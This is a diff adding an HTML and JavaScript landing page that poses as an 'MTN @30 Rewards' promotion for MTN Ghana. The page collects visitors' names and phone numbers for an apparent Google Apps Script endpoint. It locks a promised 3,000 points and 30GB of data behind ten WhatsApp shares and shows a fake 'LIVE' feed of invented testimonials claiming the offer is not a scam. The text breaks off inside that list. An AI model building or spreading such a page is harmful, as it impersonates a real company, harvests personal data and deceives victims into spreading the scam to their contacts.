@@ -1,0 +1,1785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>MTN @30 Rewards - Share & Earn</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-yellow: #FFD700;
+            --primary-blue: #4169E1;
+            --dark-bg: #1a1a1a;
+            --light-text: #ffffff;
+            --border-radius: 12px;
+            --transition: all 0.3s ease;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, var(--primary-yellow) 0%, var(--primary-yellow) 80%, var(--primary-blue) 80%, var(--primary-blue) 100%);
+            min-height: 100vh;
+            color: #333;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+            padding: 0;
+            background: white;
+            min-height: 100vh;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Banner Styles */
+        .banner {
+            width: 100%;
+            height: 300px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, var(--primary-yellow) 0%, var(--primary-blue) 100%);
+        }
+
+        .banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .banner-top {
+            border-radius: 0 0 20px 20px;
+        }
+
+        .banner-bottom {
+            border-radius: 20px 20px 0 0;
+        }
+
+        /* Section Styles */
+        section {
+            padding: 30px 20px;
+            animation: slideInUp 0.5s ease;
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .section-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        /* Security Notice Section */
+        .security-notice-section {
+            padding: 12px 20px;
+            background: #fff3cd;
+            border-bottom: 2px solid #ffc107;
+        }
+
+        .security-notice {
+            background: white;
+            border: 2px solid #ffc107;
+            border-radius: var(--border-radius);
+            padding: 12px 15px;
+            border-left: 5px solid #ff6b6b;
+        }
+
+        .notice-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+
+        .warning-icon {
+            font-size: 20px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        .notice-header h3 {
+            color: #d32f2f;
+            font-size: 16px;
+            margin: 0;
+        }
+
+        .security-notice p {
+            color: #333;
+            font-size: 12px;
+            line-height: 1.4;
+            margin: 4px 0;
+        }
+
+        .security-notice strong {
+            color: #d32f2f;
+        }
+
+        /* Registration Section */
+        .registration-section {
+            background: linear-gradient(135deg, #f8f9ff 0%, #fff8f0 100%);
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        .registration-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 10px rgba(65, 105, 225, 0.2);
+        }
+
+        /* Button Styles */
+        .btn {
+            padding: 14px 24px;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, var(--primary-blue) 0%, #1e40af 100%);
+            color: white;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(65, 105, 225, 0.3);
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(65, 105, 225, 0.4);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .btn-whatsapp {
+            background: linear-gradient(135deg, #25d366 0%, #20ba58 100%);
+            color: white;
+            width: 100%;
+            font-size: 18px;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+        }
+
+        .btn-whatsapp:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
+        }
+
+        .btn-whatsapp:disabled {
+            background: linear-gradient(135deg, #ccc 0%, #999 100%);
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .btn-claim-reward {
+            background: linear-gradient(135deg, var(--primary-yellow) 0%, #ffc700 100%);
+            color: #333;
+            width: 100%;
+            font-size: 18px;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+            position: relative;
+        }
+
+        .btn-claim-reward:hover:not(.locked):not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.4);
+        }
+
+        .btn-claim-reward.locked {
+            background: linear-gradient(135deg, #ccc 0%, #999 100%);
+            color: #666;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .lock-icon {
+            font-size: 24px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-5px);
+            }
+        }
+
+        /* Progress Section */
+        .progress-section {
+            padding: 25px 20px;
+            background: linear-gradient(135deg, #f0f8ff 0%, #fff0f5 100%);
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .progress-label, .progress-percentage {
+            font-weight: 600;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-blue) 0%, var(--primary-yellow) 100%);
+            width: 0%;
+            transition: width 0.5s ease;
+            box-shadow: 0 0 10px rgba(65, 105, 225, 0.5);
+        }
+
+        .progress-message {
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        .progress-message.close-message {
+            color: #ff9800;
+            font-weight: 700;
+            animation: pulse 1.5s infinite;
+        }
+
+        /* Sharing Section */
+        .sharing-section {
+            padding: 30px 20px;
+            background: linear-gradient(135deg, #fffaf0 0%, #f0f8ff 100%);
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        .claim-reward-wrapper {
+            margin: 20px 0;
+        }
+
+        .share-message {
+            background: #e8f5e9;
+            border-left: 4px solid #4caf50;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            animation: slideInUp 0.3s ease;
+        }
+
+        .share-message p {
+            margin: 5px 0;
+            color: #2e7d32;
+            font-weight: 500;
+        }
+
+        .success-message {
+            background: #c8e6c9;
+            border: 2px solid #4caf50;
+            color: #2e7d32;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin-top: 15px;
+            animation: slideInUp 0.3s ease;
+        }
+
+        .register-prompt {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        /* Facebook Comments Section */
+        .facebook-section {
+            padding: 30px 20px;
+            background: linear-gradient(135deg, #f8f9ff 0%, #fff8f0 100%);
+        }
+
+        .facebook-header-info {
+            background: linear-gradient(135deg, var(--primary-blue) 0%, #1e40af 100%);
+            color: white;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .facebook-header-info h3 {
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+
+        .facebook-header-info p {
+            font-size: 14px;
+            opacity: 0.95;
+        }
+
+        .comments-container {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            margin-bottom: 25px;
+        }
+
+        .facebook-comment {
+            padding: 15px;
+            border-bottom: 1px solid #e0e0e0;
+            display: flex;
+            gap: 10px;
+            transition: var(--transition);
+            animation: slideInUp 0.5s ease;
+        }
+
+        .facebook-comment:hover {
+            background: #f9f9f9;
+        }
+
+        .facebook-comment:last-child {
+            border-bottom: none;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--primary-yellow) 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            flex-shrink: 0;
+            font-size: 16px;
+            overflow: hidden;
+            border: 2px solid #ddd;
+        }
+
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .comment-content {
+            flex: 1;
+        }
+
+        .comment-header {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-bottom: 5px;
+        }
+
+        .comment-name {
+            font-weight: 700;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .comment-time {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .comment-text {
+            color: #333;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 8px;
+            background: #f0f0f0;
+            padding: 8px;
+            border-radius: 6px;
+        }
+
+        .comment-rewards {
+            background: #e8f5e9;
+            border-left: 3px solid #4caf50;
+            padding: 6px 8px;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #2e7d32;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .comment-reactions {
+            display: flex;
+            gap: 15px;
+            font-size: 12px;
+            color: #555;
+        }
+
+        .reaction-item {
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .reaction-item:hover {
+            color: var(--primary-blue);
+        }
+
+        .live-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: #ff4444;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-left: 8px;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .live-dot {
+            width: 6px;
+            height: 6px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        /* Comment Form Styles */
+        .comment-form-section {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .comment-form-section h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .form-group-comment {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .comment-textarea {
+            width: 100%;
+            min-height: 100px;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 14px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            resize: vertical;
+            transition: var(--transition);
+        }
+
+        .comment-textarea:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 10px rgba(65, 105, 225, 0.2);
+        }
+
+        .btn-submit-comment {
+            background: linear-gradient(135deg, var(--primary-yellow) 0%, #ffc700 100%);
+            color: #333;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 12px;
+            border: none;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn-submit-comment:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.4);
+        }
+
+        .btn-submit-comment:active {
+            transform: translateY(0);
+        }
+
+        /* Confirmation Banner */
+        .confirmation-banner {
+            background: linear-gradient(135deg, var(--primary-yellow) 0%, var(--primary-blue) 100%);
+            color: white;
+            padding: 20px;
+            border-radius: var(--border-radius);
+            margin-bottom: 25px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            animation: slideInDown 0.5s ease;
+        }
+
+        @keyframes slideInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .confirmation-banner h3 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .confirmation-banner p {
+            font-size: 14px;
+            margin: 8px 0;
+            line-height: 1.5;
+        }
+
+        .confirmation-banner .loading-text {
+            font-size: 16px;
+            font-weight: 700;
+            margin: 12px 0;
+            animation: pulse 1.5s infinite;
+        }
+
+        .confirmation-banner .final-text {
+            font-size: 13px;
+            margin-top: 10px;
+            opacity: 0.95;
+        }
+
+        .reset-btn-wrapper {
+            margin-top: 15px;
+        }
+
+        .btn-reset {
+            background: white;
+            color: var(--primary-blue);
+            padding: 10px 20px;
+            border: 2px solid white;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .btn-reset:hover {
+            background: transparent;
+            color: white;
+        }
+
+        /* Status message for comment submission */
+        .comment-status {
+            background: #fff8e1;
+            border-left: 4px solid #ffb300;
+            padding: 12px;
+            border-radius: 8px;
+            color: #6b4f00;
+            font-weight: 600;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            section {
+                padding: 20px 15px;
+            }
+
+            .section-title {
+                font-size: 20px;
+            }
+
+            .banner {
+                height: 200px;
+            }
+
+            .security-notice-section {
+                padding: 8px 15px;
+            }
+
+            .security-notice {
+                padding: 10px 12px;
+            }
+
+            .notice-header h3 {
+                font-size: 14px;
+            }
+
+            .security-notice p {
+                font-size: 11px;
+            }
+
+            .form-group input {
+                padding: 10px 12px;
+                font-size: 16px;
+            }
+
+            .btn {
+                padding: 12px 18px;
+                font-size: 14px;
+            }
+
+            .confirmation-banner {
+                padding: 15px;
+                margin-bottom: 20px;
+            }
+
+            .confirmation-banner h3 {
+                font-size: 20px;
+                margin-bottom: 8px;
+            }
+
+            .confirmation-banner p {
+                font-size: 12px;
+                margin: 6px 0;
+            }
+
+            .facebook-comment {
+                padding: 12px;
+            }
+
+            .comment-name {
+                font-size: 13px;
+            }
+
+            .comment-text {
+                font-size: 13px;
+            }
+
+            .comment-form-section {
+                padding: 15px;
+            }
+
+            .comment-textarea {
+                min-height: 80px;
+                font-size: 13px;
+            }
+        }
+
+        /* Scrollbar Styling */
+        .comments-container::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .comments-container::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+
+        .comments-container::-webkit-scrollbar-thumb {
+            background: var(--primary-blue);
+            border-radius: 3px;
+        }
+
+        .comments-container::-webkit-scrollbar-thumb:hover {
+            background: #1e40af;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Top Banner Image -->
+        <div class="banner banner-top">
+            <img src="https://via.placeholder.com/1200x400/FFD700/333?text=MTN+@30+Rewards" alt="Top Banner">
+        </div>
+
+        <!-- Security Notice Section -->
+        <section class="security-notice-section">
+            <div class="security-notice">
+                <div class="notice-header">
+                    <span class="warning-icon">⚠️</span>
+                    <h3>Important Security Notice</h3>
+                </div>
+                <p>MTN Ghana will only contact official winners at <strong>0244300000</strong>.</p>
+                <p><strong>Never share your Mobile Money PIN or OTP</strong> with anyone claiming you won.</p>
+            </div>
+        </section>
+
+        <!-- Registration Section -->
+        <section class="registration-section" id="registrationSection">
+            <h1 class="section-title">Register & Share</h1>
+            <form id="registrationForm" class="registration-form">
+                <div class="form-group">
+                    <label for="fullName">Full Name</label>
+                    <input 
+                        type="text" 
+                        id="fullName" 
+                        placeholder="Enter your full name" 
+                        required
+                        maxlength="50"
+                    >
+                </div>
+                <div class="form-group">
+                    <label for="phoneNumber">Phone Number</label>
+                    <input 
+                        type="tel" 
+                        id="phoneNumber" 
+                        placeholder="Enter your phone number" 
+                        required
+                        pattern="[0-9+\-\s]{10,15}"
+                    >
+                </div>
+                <button type="submit" class="btn btn-submit">Register Now</button>
+            </form>
+            <div id="successMessage" class="success-message" style="display: none;">
+                ✓ Registration successful! Start sharing to earn rewards.
+            </div>
+        </section>
+
+        <!-- Progress Section - Always Visible -->
+        <section class="progress-section">
+            <div class="progress-info">
+                <span class="progress-label">Shares: <strong id="shareCount">0</strong>/10</span>
+                <span class="progress-percentage"><strong id="progressPercentage">0</strong>%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <p class="progress-message">Share 5 more times to unlock your reward! 🎁</p>
+        </section>
+
+        <!-- Sharing Section - Always Visible -->
+        <section class="sharing-section">
+            <h2 class="section-title">Share & Earn</h2>
+            
+            <!-- Claim Reward Button -->
+            <div class="claim-reward-wrapper">
+                <button id="claimRewardBtn" class="btn btn-claim-reward locked" disabled>
+                    <span class="lock-icon">🔒</span>
+                    <span class="btn-text">Claim Reward</span>
+                </button>
+            </div>
+
+            <!-- WhatsApp Share Button -->
+            <button id="whatsappShareBtn" class="btn btn-whatsapp">
+                <i class="fab fa-whatsapp"></i> Share on WhatsApp
+            </button>
+
+            <div id="shareMessage" class="share-message" style="display: none;">
+                <p>🎉 Great! You've shared successfully.</p>
+                <p id="shareCountMessage"></p>
+            </div>
+
+            <div id="registerPrompt" class="register-prompt" style="display: none;">
+                📝 Please register first to share and earn rewards!
+            </div>
+        </section>
+
+        <!-- Facebook Comments Section - Always Visible -->
+        <section class="facebook-section">
+            <!-- Confirmation Message -->
+            <div id="confirmationBanner" class="confirmation-banner" style="display: none;">
+                <h3>🎉 Congratulations!</h3>
+                <p><strong>Congratulations, you've unlocked your reward!</strong></p>
+                <p>We will confirm your shared WhatsApp number and groups</p>
+                <p class="loading-text"><strong>3,000 points and 30GB loading...</strong></p>
+                <p class="final-text">Once confirmed, you will receive your points and data.</p>
+                <div class="reset-btn-wrapper">
+                    <button id="activateButton" class="btn-reset">Activate</button>
+                </div>
+            </div>
+
+            <!-- Share Experience Section -->
+            <div class="comment-form-section" id="commentFormSection">
+                <h3>📝 Share Your Experience</h3>
+                <form id="commentForm" onsubmit="handleCommentSubmit(event)">
+                    <div class="form-group-comment">
+                        <textarea 
+                            class="comment-textarea" 
+                            id="commentText" 
+                            placeholder="Tell us about your experience receiving the points and data..." 
+                            required
+                            maxlength="500"
+                        ></textarea>
+                        <button type="submit" id="submitCommentBtn" class="btn-submit-comment">
+                            Submit Comment & Continue
+                        </button>
+                        <!-- status area for comment submission -->
+                        <div id="commentStatus" class="comment-status" style="display: none;">Your Comment Will appear soon</div>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Comments Display -->
+            <div class="facebook-header-info">
+                <h3>🎉 See What Others Are Receiving <span class="live-indicator"><span class="live-dot"></span> LIVE</span></h3>
+                <p>Real people, real rewards! Join thousands who are earning 3,000 points & 30GB data</p>
+            </div>
+
+            <div class="comments-container" id="commentsContainer">
+                <!-- Comments will be populated here -->
+            </div>
+        </section>
+
+        <!-- Bottom Banner Image -->
+        <div class="banner banner-bottom">
+            <img src="https://via.placeholder.com/1200x400/4169E1/FFF?text=Keep+Sharing+and+Winning" alt="Bottom Banner">
+        </div>
+    </div>
+
+    <script>
+        // ==================== CONFIG ====================
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxhlyZZrv5NOBGh6kKd5_Xj91OdtK7aI5ypE562UEDtTG95vFQwGoruzFztqiHGNiHkyw/exec";
+        const COMMENT_SUBMISSION_URL = "https://www.livescores.com";
+
+        // State Management
+        let appState = {
+            isRegistered: false,
+            userInfo: null,
+            shareCount: 0,
+            claimedReward: false,
+            sentToWebApp: false
+        };
+
+        // All 30 Ghanaian Commenters with Profile Pictures
+        const allCommenters = [
+            {
+                name: 'Kofi Mensah',
+                picture: 'https://via.placeholder.com/40x40/FFD700/333?text=KM',
+                time: 'Just now',
+                comment: 'Just received my 3000 points and 30GB! This is amazing 😍',
+                points: 3000,
+                data: 30,
+                likes: 234,
+                replies: 45,
+                shares: 12
+            },
+            {
+                name: 'Ama Boateng',
+                picture: 'https://via.placeholder.com/40x40/4169E1/FFF?text=AB',
+                time: '2 minutes ago',
+                comment: 'Finally! I got my rewards after sharing 10 times. Worth every share! 🔥',
+                points: 3000,
+                data: 30,
+                likes: 189,
+                replies: 32,
+                shares: 8
+            },
+            {
+                name: 'Kwame Asante',
+                picture: 'https://via.placeholder.com/40x40/25d366/FFF?text=KA',
+                time: '5 minutes ago',
+                comment: 'This is real! Just checked my MTN account and everything is there. Highly recommended! ✅',
+                points: 3000,
+                data: 30,
+                likes: 356,
+                replies: 67,
+                shares: 24
+            },
+            {
+                name: 'Efua Owusu',
+                picture: 'https://via.placeholder.com/40x40/FF6B6B/FFF?text=EO',
+                time: '8 minutes ago',
+                comment: 'Been with MTN for years and this is the best promotion ever! 🎁',
+                points: 3000,
+                data: 30,
+                likes: 145,
+                replies: 28,
+                shares: 6
+            },
+            {
+                name: 'Yaw Kato',
+                picture: 'https://via.placeholder.com/40x40/FFA500/FFF?text=YK',
+                time: '12 minutes ago',
+                comment: 'Shared with my family group and cousins. Already got 2000 points so far. Let\'s get more! 💪',
+                points: 2000,
+                data: 20,
+                likes: 212,
+                replies: 41,
+                shares: 15
+            },
+            {
+                name: 'Abena Osei',
+                picture: 'https://via.placeholder.com/40x40/9C27B0/FFF?text=AO',
+                time: '15 minutes ago',
+                comment: 'This MTN @30 promo is legit. Got all my 30GB just as promised. Very satisfied 👌',
+                points: 3000,
+                data: 30,
+                likes: 178,
+                replies: 35,
+                shares: 9
+            },
+            {
+                name: 'Emmanuel Boateng',
+                picture: 'https://via.placeholder.com/40x40/00BCD4/FFF?text=EB',
+                time: '18 minutes ago',
+                comment: 'My internet has been loading all night with the 30GB. MTN you are doing great! 🚀',
+                points: 3000,
+                data: 30,
+                likes: 234,
+                replies: 52,
+                shares: 18
+            },
+            {
+                name: 'Nadia Appiah',
+                picture: 'https://via.placeholder.com/40x40/E91E63/FFF?text=NA',
+                time: '22 minutes ago',
+                comment: 'I was skeptical at first but this is real. The points are showing in my account right now! 💯',
+                points: 3000,
+                data: 30,
+                likes: 289,
+                replies: 58,
+                shares: 21
+            },
+            {
+                name: 'Samuel Oppong',
+                picture: 'https://via.placeholder.com/40x40/2196F3/FFF?text=SO',
+                time: '25 minutes ago',
+                comment: 'Just got my notification from MTN! 3000 points credited successfully! Everyone should register! 🎉',
+                points: 3000,
+                data: 30,
+                likes: 412,
+                replies: 89,
+                shares: 32
+            },
+            {
+                name: 'Grace Adjei',
+                picture: 'https://via.placeholder.com/40x40/4CAF50/FFF?text=GA',
+                time: '30 minutes ago',
+                comment: 'This is the most generous promotion I\'ve seen. 30GB is massive! Thanks MTN @30! 🙏',
+                points: 3000,
+                data: 30,
+                likes: 156,
+                replies: 26,
+                shares: 7
+            },
+            {
+                name: 'Kwesi Amoah',
+                picture: 'https://via.placeholder.com/40x40/FF5722/FFF?text=KA',
+                time: '35 minutes ago',
+                comment: 'Unbelievable! My whole family registered and we all got the rewards. This is incredible! 🤩',
+                points: 3000,
+                data: 30,
+                likes: 298,
+                replies: 44,
+                shares: 19
+            },
+            {
+                name: 'Adwoa Sarpong',
+                picture: 'https://via.placeholder.com/40x40/CDDC39/333?text=AS',
+                time: '40 minutes ago',
+                comment: 'The easiest 3000 points I\'ve ever earned. Just shared on WhatsApp! 😊',
+                points: 3000,
+                data: 30,
+                likes: 167,
+                replies: 31,
+                shares: 11
+            },
+            {
+                name: 'Felix Appiah',
+                picture: 'https://via.placeholder.com/40x40/00E5FF/FFF?text=FA',
+                time: '45 minutes ago',
+                comment: 'My sister recommended this to me. Now we\'re both enjoying the benefits! 🎊',
+                points: 3000,
+                data: 30,
+                likes: 203,
+                replies: 38,
+                shares: 14
+            },
+            {
+                name: 'Comfort Mensah',
+                picture: 'https://via.placeholder.com/40x40/FF1744/FFF?text=CM',
+                time: '50 minutes ago',
+                comment: 'Been using the 30GB to stream without worries. Best decision ever! 📱',
+                points: 3000,
+                data: 30,
+                likes: 245,
+                replies: 43,
+                shares: 16
+            },
+            {
+                name: 'Darko Owusu',
+                picture: 'https://via.placeholder.com/40x40/651FFF/FFF?text=DO',
+                time: '55 minutes ago',
+                comment: 'Working from home and this data is a lifesaver. Thanks MTN! 💼',
+                points: 3000,
+                data: 30,
+                likes: 189,
+                replies: 36,
+                shares: 13
+            },
+            {
+                name: 'Cynthia Boakye',
+                picture: 'https://via.placeholder.com/40x40/00C853/FFF?text=CB',
+                time: '1 hour ago',
+                comment: 'Not just points but also data? This is beyond my expectations! 🌟',
+                points: 3000,
+                data: 30,
+                likes: 321,
+                replies: 59,
+                shares: 25
+            },
+            {
+                name: 'Benjamin Addae',
+                picture: 'https://via.placeholder.com/40x40/FF6F00/FFF?text=BA',
+                time: '1 hour ago',
+                comment: 'Registered, shared, and got rewards. Process is very seamless! ✨',
+                points: 3000,
+                data: 30,
+                likes: 267,
+                replies: 49,
+                shares: 22
+            },
+            {
+                name: 'Diana Serwaa',
+                picture: 'https://via.placeholder.com/40x40/D50000/FFF?text=DS',
+                time: '1 hour ago',
+                comment: 'MTN is really showing love to us Ghanaians. 30 years celebration is legit! 🎂',
+                points: 3000,
+                data: 30,
+                likes: 278,
+                replies: 51,
+                shares: 20
+            },
+            {
+                name: 'Andrew Nyarko',
+                picture: 'https://via.placeholder.com/40x40/1565C0/FFF?text=AN',
+                time: '1 hour ago',
+                comment: 'Already shared with 50+ people in my contacts. Spreading the good news! 📢',
+                points: 3000,
+                data: 30,
+                likes: 334,
+                replies: 62,
+                shares: 28
+            },
+            {
+                name: 'Theresa Adom',
+                picture: 'https://via.placeholder.com/40x40/C2185B/FFF?text=TA',
+                time: '1 hour ago',
+                comment: 'My kids are so happy with the data I got. They can now do their online classes! 📚',
+                points: 3000,
+                data: 30,
+                likes: 245,
+                replies: 46,
+                shares: 17
+            },
+            {
+                name: 'Gilbert Mensah',
+                picture: 'https://via.placeholder.com/40x40/00838F/FFF?text=GM',
+                time: '2 hours ago',
+                comment: 'This is not a scam. I confirmed with MTN directly. Register now! ✅',
+                points: 3000,
+                data: 30,
+                likes: 412,
+                replies: 76,
+                shares: 35
+            },
+            {
+                name: 'Patience Opoku',
+                picture: 'https://via.placeholder.com/40x40/F57F17/FFF?text=PO',
+                time: '2 hours ago',
+                comment: 'I was hesitant but my friend\'s experience convinced me. Now I\'m a believer! 🙌',
+                points: 3000,
+                data: 30,
+                likes: 198,
+                replies: 37,
+                shares: 12
+            },
+            {
+                name: 'Cornelius Asare',
+                picture: 'https://via.placeholder.com/40x40/455A64/FFF?text=CA',
+                time: '2 hours ago',
+                comment: 'Business is booming with this 30GB. Can now respond to clients instantly! 💻',
+                points: 3000,
+                data: 30,
+                likes: 267,
+                replies: 48,
+                shares: 19
+            },
+            {
+                name: 'Esther Ayomide',
+                picture: 'https://via.placeholder.com/40x40/AD1457/FFF?text=EA',
+                time: '2 hours ago',
+                comment: 'Unlimited possibilities with this data package. MTN is the best! 🏆',
+                points: 3000,
+                data: 30,
+                likes: 289,
+                replies: 54,
+                shares: 23
+            },
+            {
+                name: 'Henry Boateng',
+                picture: 'https://via.placeholder.com/40x40/1A237E/FFF?text=HB',
+                time: '2 hours ago',
+                comment: 'Every Ghanaian should know about this. Share it with your loved ones! ❤️',
+                points: 3000,
+                data: 30,
+                likes: 356,
+                replies: 71,
+                shares: 30
+            },
+            {
+                name: 'Justine Nkrumah',
+                picture: 'https://via.placeholder.com/40x40/006064/FFF?text=JN',
+                time: '2 hours ago',
+                comment: 'Got the reward faster than I expected! Excellent service MTN! 🚀',
+                points: 3000,
+                data: 30,
+                likes: 223,
+                replies: 42,
+                shares: 15
+            },
+            {
+                name: 'Kristina Akosua',
+                picture: 'https://via.placeholder.com/40x40/E65100/FFF?text=KA',
+                time: '3 hours ago',
+                comment: 'This promotion deserves more publicity. Everyone needs to know! 📣',
+                points: 3000,
+                data: 30,
+                likes: 312,
+                replies: 58,
+                shares: 26
+            },
+            {
+                name: 'Lawrence Boadi',
+                picture: 'https://via.placeholder.com/40x40/3F51B5/FFF?text=LB',
+                time: '3 hours ago',
+                comment: 'Testimonies like these are real. I can confirm! Been receiving notifications! 📲',
+                points: 3000,
+                data: 30,
+                likes: 401,
+                replies: 83,
+                shares: 38
+            },
+            {
+                name: 'Margaret Akyaa',
+                picture: 'https://via.placeholder.com/40x40/7B1FA2/FFF?text=MA',
+                time: '3 hours ago',
+                comment: 'My village friends and I all registered. We\'re all getting rewards! 🎉',
+                points: 3000,
+                data: 30,
+                likes: 334,
+                replies: 65,
+                shares: 29
+            },
+            {
+                name: 'Newton Oteng',
+                picture: 'https://via.placeholder.com/40x40/512DA8/FFF?text=NO',
+                time: '3 hours ago',
